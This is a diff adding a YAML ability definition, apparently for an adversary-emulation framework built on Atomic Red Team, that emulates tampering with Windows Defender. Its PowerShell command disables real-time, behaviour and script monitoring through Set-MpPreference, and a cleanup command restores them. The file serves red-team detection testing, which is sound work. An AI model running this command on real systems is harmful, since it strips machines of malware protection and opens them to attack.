@@ -1,0 +1,34 @@
+- id: 6b8df440-51ec-4d53-bf83-899591c9b5d7
+  name: Tamper with Windows Defender ATP PowerShell
+  description: 'Attempting to disable scheduled scanning and other parts of windows
+    defender atp. Upon execution Virus and Threat Protection will show as disabled
+
+    in Windows settings.'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring
+          1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBlockAtFirstSeen
+          1
+        cleanup: Set-MpPreference -DisableRealtimeMonitoring 0; Set-MpPreference -DisableBehaviorMonitoring
+          0; Set-MpPreference -DisableScriptScanning 0; Set-MpPreference -DisableBlockAtFirstSeen
+          0
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1685
+  - defense-impairment
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2026-04-14T22:53:26.949Z'
+    atomic_guid: 6b8df440-51ec-4d53-bf83-899591c9b5d7
+    import_timestamp: '2026-05-02T05:00:41.557184Z'
